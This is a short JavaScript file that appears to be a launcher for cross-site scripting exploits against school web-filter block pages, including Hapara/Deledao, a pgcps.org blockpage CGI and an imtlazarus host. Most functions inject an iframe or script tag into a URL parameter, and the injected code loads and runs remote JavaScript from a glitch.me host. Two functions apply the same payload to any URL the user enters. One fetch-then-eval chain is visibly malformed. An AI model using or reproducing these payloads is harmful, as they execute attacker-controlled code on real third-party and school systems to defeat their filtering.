const btn = document.querySelector("button");
if (btn) {
  btn.onmousedown = function () {
    btn.classList.toggle("dipped");
  };

  btn.onmouseup = function () {
    btn.classList.toggle("dipped");
  };
}
function haparaExploit() {
  location = 'https://static.deledao.com/hapara/blockTP.html?site=<iframe srcdoc="<script> fetch(`https://doughcookie.glitch.me/doughultra.js`).then(e=>{e=>{e.text().then(f=>{eval(f)})}})</script>"></iframe>';
}

function imtlazarus() {
  location = 'https://venturagassol.imtlazarus.com/?user=&url=<script src="https://doughcookie.glitch.me/doughultra.js"></script>'
}

function CKAuth() {
  location = 'https://pg-bfj-ckf02.pgcps.org/cgi-bin/blockpage/blockpage.cgi?URL=%3Ciframe%20srcdoc=%22%3Cscript%3Efetch(%27https://doughcookie.glitch.me/doughultra.js%27).then(e=%3E%7Be.text().then(f=%3E%7Beval(f)%7D)%7D);%3C/script%3E%22%3E%3C/iframe%3E';
}

function otherPromptExploit() {
  const url = prompt(
    "Insert your URL with innerHTML exploit here, replace where the HTML should go with {html}.",
    "https://example.com/?url={html}"
  );
  const replacedUrl = url.replace(
    "{html}",
    `<iframe srcdoc="<script src='https://doughcookie.glitch.me/doughultra.js'></script>"></iframe>`
  );
  open(replacedUrl);
}

function otherExploit() {
  const customUrl = document.getElementById("url").value;
  open(
    customUrl.startsWith("https://")
      ? customUrl +
          "<iframe srcdoc=\"<script src='https://doughcookie.glitch.me/doughultra.js'></script>\"></iframe>"
      : "https://" +
          customUrl +
          "<iframe srcdoc=\"<script src='https://doughcookie.glitch.me/doughultra.js'></script>\"></iframe>"
  );
}